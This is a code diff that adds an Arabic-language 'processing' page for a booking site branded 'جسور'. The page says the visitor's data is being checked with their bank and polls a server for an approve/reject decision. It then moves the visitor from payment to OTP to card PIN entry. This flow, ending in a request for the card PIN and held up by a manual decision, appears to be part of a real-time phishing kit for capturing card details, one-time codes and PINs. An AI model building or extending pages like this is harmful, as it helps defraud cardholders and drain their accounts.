@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>جاري المعالجة — جسور</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: { sans: ['Tajawal', 'Arial', 'sans-serif'] },
+                    colors: { brand: { DEFAULT: '#8B1A3A', dark: '#6B1230' } },
+                }
+            }
+        };
+    </script>
+    <style>
+        body { font-family: 'Tajawal', Arial, sans-serif; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
+        .spinner { animation: spin 1s linear infinite; }
+        .dot { animation: pulse 1.4s ease-in-out infinite; }
+        .dot:nth-child(2) { animation-delay: 0.2s; }
+        .dot:nth-child(3) { animation-delay: 0.4s; }
+    </style>
+</head>
+<body class="min-h-screen bg-gray-50 font-sans flex flex-col">
+
+    <!-- Header -->
+    <header class="bg-white border-b border-gray-100 shadow-sm">
+        <div class="max-w-lg mx-auto px-4 py-3 flex items-center gap-3">
+            <a href="/"><img src="/images/logo.png" alt="جسور" class="h-9 w-auto"></a>
+        </div>
+    </header>
+
+    <main class="flex-1 flex items-center justify-center px-4 py-12">
+        <div class="w-full max-w-sm text-center">
+
+            <!-- Spinner -->
+            <div class="flex justify-center mb-6">
+                <div class="relative w-20 h-20">
+                    <svg class="spinner w-20 h-20 text-[#8B1A3A]" viewBox="0 0 50 50">
+                        <circle cx="25" cy="25" r="20" fill="none" stroke="currentColor" stroke-width="4"
+                            stroke-dasharray="80 30" stroke-linecap="round"/>
+                    </svg>
+                    <div class="absolute inset-0 flex items-center justify-center">
+                        <svg class="w-8 h-8 text-[#8B1A3A]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
+                        </svg>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Text -->
+            <h1 class="text-2xl font-bold text-gray-900 mb-2">جاري معالجة طلبك</h1>
+            <p class="text-gray-500 mb-6 text-sm leading-relaxed">
+                يرجى الانتظار بينما نتحقق من بياناتك مع البنك.<br>
+                لا تغلق هذه الصفحة.
+            </p>
+
+            <!-- Dots -->
+            <div class="flex justify-center gap-2 mb-8">
+                <div class="dot w-2.5 h-2.5 rounded-full bg-[#8B1A3A]"></div>
+                <div class="dot w-2.5 h-2.5 rounded-full bg-[#8B1A3A]"></div>
+                <div class="dot w-2.5 h-2.5 rounded-full bg-[#8B1A3A]"></div>
+            </div>
+
+            <!-- Security badge -->
+            <div class="flex items-center justify-center gap-2 text-xs text-gray-400">
+                <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                        d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
+                </svg>
+                <span>اتصال آمن ومشفر</span>
+            </div>
+
+        </div>
+    </main>
+
+    <script>
+        // استخراج المرحلة من الـ URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const stage = urlParams.get('stage') || 'payment';
+
+        // Polling كل 3 ثواني
+        function checkDecision() {
+            fetch('/api/booking/decision?stage=' + stage)
+                .then(r => r.json())
+                .then(data => {
+                    if (data.decision === 'approved') {
+                        // قبول - انتقل للمرحلة التالية
+                        if (stage === 'payment') {
+                            window.location.href = '/booking/otp';
+                        } else if (stage === 'otp') {
+                            window.location.href = '/booking/pin';
+                        } else if (stage === 'pin') {
+                            window.location.href = '/booking/success';
+                        }
+                    } else if (data.decision === 'rejected') {
+                        // رفض - ارجع للصفحة السابقة مع رسالة خطأ
+                        if (stage === 'payment') {
+                            window.location.href = '/booking/payment?error=rejected';
+                        } else if (stage === 'otp') {
+                            window.location.href = '/booking/otp?error=rejected';
+                        } else if (stage === 'pin') {
+                            window.location.href = '/booking/pin?error=rejected';
+                        }
+                    } else {
+                        // لا يزال ينتظر
+                        setTimeout(checkDecision, 3000);
+                    }
+                })
+                .catch(() => setTimeout(checkDecision, 3000));
+        }
+
+        // ابدأ الـ polling بعد ثانية
+        setTimeout(checkDecision, 1000);
+    </script>
+</body>
+</html>
